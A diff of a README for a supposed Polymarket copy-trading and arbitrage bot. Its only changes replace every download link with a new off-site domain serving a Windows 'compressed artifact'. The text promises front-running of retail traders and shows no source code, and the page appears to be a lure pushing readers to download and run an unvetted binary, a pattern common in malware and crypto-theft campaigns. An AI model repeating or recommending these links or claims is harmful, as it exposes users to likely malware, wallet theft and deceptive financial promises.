@@ -1,7 +1,7 @@
 # Polymarket Copy Trading Bot Automated Mirror Trading Engine
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20Polymarket%20copy%20trading%20bot-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex Polymarket copy trading bot" width="450">
   </a>
 </p>
@@ -29,14 +29,14 @@ To bypass standard API limits and front-run retail traders on shifting geopoliti
 Unlike restrictive, simulated paper-only utilities, this terminal is built for institutional-grade **polymarket arbitrage trading bot** operations. It provides automated execution workflows driven by real-time orderbook depth processing.
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20Polymarket%20copy%20trading%20bot-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex Polymarket copy trading bot" width="450">
   </a>
 </p>
 
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
+  <a href="https://runcortex.xyz/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
     DOWNLOAD OFFICIAL CORTEX POLYMARKET BOT PRODUCTION ARTIFACT
   </a>
 </p>
@@ -182,7 +182,7 @@ Before triggering your automated mirror trading workflow, ensure your system spe
 ---
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
+  <a href="https://runcortex.xyz/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
     [CLICK HERE TO DOWNLOAD THE FULLY AUTOMATED COPY TRADING COMPRESSED ARTIFACT]
   </a>
 </p>
